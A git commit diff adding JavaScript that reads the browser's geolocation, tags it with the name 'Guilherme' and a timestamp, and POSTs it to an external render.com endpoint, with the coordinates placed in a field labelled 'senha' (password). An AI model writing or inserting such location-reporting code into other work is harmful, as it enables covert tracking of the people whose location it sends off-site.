977c75c0f4de739034138759548263ac3bc3c0ed
jukio98 <113953323+jukio98@users.noreply.github.com>
2026-05-06 20:35:43 -0300

    Atualizar o servidorGui.js

--- servidorGui.js
+++ servidorGui.js
@@ -1,2 +1,64 @@
 ////com.info("oi Guilherme");
 ////com.dialogo("Servidor Online, pq eu sou foda !!!");
+
+
+
+usuario="Guilherme"
+local=(()=>{
+    hth=new Date()
+    hhh=hth.getHours();
+    mmm=hth.getMinutes();
+    ddd=hth.getDate()
+    mesm=hth.getMonth();
+    
+    if(hhh<10) hhh="0"+hhh;
+        if(mmm<10) mmm="0"+mmm;
+        if(ddd<10) ddd="0"+ddd;
+        if(mesm<10) mesm="0"+mesm;
+    
+    
+    dia_do_envio=hhh+":"+mmm+" - "+ddd+"/"+mesm
+    
+if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(
+            (posicao) => {
+                const lat = posicao.coords.latitude;
+                const lon = posicao.coords.longitude;
+geo=lat+","+lon+" ::: Data :::"+dia_do_envio;
+
+enviar(usuario,geo)
+            })
+}else{
+    
+}
+
+
+
+})
+
+
+const ur="https://apis-q4i9.onrender.com/cadastro";
+
+ enviar=((usu,loc)=>{
+    
+ fetch(ur, {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        nome:usu,
+        senha:loc,
+        data:new Date
+    })
+}).then((resposta)=>{
+    return resposta.json()
+
+    }).then((an)=>{
+      
+    }).catch((er)=>{
+        
+    })
+
+   
+ })
